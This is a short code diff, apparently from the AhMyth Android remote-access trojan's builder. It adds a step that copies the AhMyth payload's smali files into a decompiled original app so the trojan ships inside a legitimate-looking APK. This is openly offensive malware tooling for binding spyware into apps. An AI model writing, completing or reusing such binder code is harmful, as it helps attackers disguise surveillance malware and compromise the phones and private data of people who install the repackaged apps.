@@ -118,7 +118,18 @@ fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
                     console.log();
                     return;
                 };
-
+                
+                console.log("Copying AhMyth Payload Files to Original App...");
+                console.log();
+                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
+                    if (error) {
+                        console.log('Copying Failed!');
+                		console.log();
+                		return; 
+                    };
+                    
+                });
+                
             });
 
         } else {
